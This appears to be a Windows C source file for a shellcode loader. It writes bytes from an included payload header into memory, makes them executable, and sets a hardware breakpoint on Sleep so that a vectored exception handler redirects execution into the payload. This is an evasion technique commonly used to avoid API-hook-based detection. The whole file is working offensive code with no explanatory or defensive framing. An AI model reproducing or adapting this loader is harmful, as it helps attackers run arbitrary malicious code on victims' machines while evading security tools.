#include <windows.h>
#include <stdio.h>
#include "Payload.h"

#pragma warning(disable : 4334)

typedef VOID(WINAPI *fnSleep)(DWORD dwMilliseconds);
fnSleep pSleep;
PVOID exec_mem = NULL;

BOOL SetHwBp(HANDLE hThread, PVOID pAddress, DWORD regIndex)
{

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hThread, &ctx))
    {
        return FALSE;
    }

    switch (regIndex)
    {
    case 0:
        ctx.Dr0 = (DWORD_PTR)pAddress;
        break;
    case 1:
        ctx.Dr1 = (DWORD_PTR)pAddress;
        break;
    case 2:
        ctx.Dr2 = (DWORD_PTR)pAddress;
        break;
    case 3:
        ctx.Dr3 = (DWORD_PTR)pAddress;
        break;
    default:
        return FALSE;
    }

    ctx.Dr7 |= (1 << (regIndex * 2));
    ctx.Dr7 &= ~(1 << (16 + regIndex * 4));
    ctx.Dr7 &= ~(1 << (17 + regIndex * 4));

    if (!SetThreadContext(hThread, &ctx))
    {
        return FALSE;
    }

    return TRUE;
}

LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS pExceptionInfo)
{

    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
    {

        if (pExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)pSleep)
        {

            printf("Hardware  breakpoint hit at Sleep!\n");

            pExceptionInfo->ContextRecord->Rip = (DWORD_PTR)exec_mem;

            pExceptionInfo->ContextRecord->EFlags |= 0x10000;
        }

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

int main()
{

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pSleep = (fnSleep)GetProcAddress(hKernel32, "Sleep");

    HANDLE hThread = GetCurrentThread();

    AddVectoredExceptionHandler(1, VectoredHandler);
    SetHwBp(hThread, (PVOID)pSleep, 0);

    exec_mem = VirtualAllocEx(GetCurrentProcess(), NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (exec_mem == NULL)
    {
        printf("Failed to allocate memory for payload.\n");
        return 1;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(GetCurrentProcess(), exec_mem, payload, payloadSize, &bytesWritten))
    {
        printf("Failed to write payload to memory.\n");
        return 1;
    }

    DWORD oldProtect;
    if (!VirtualProtectEx(GetCurrentProcess(), exec_mem, payloadSize, PAGE_EXECUTE_READ, &oldProtect))
    {
        printf("Failed to change memory protection for payload.\n");
        return 1;
    }

    Sleep(1000);

    return 0;
}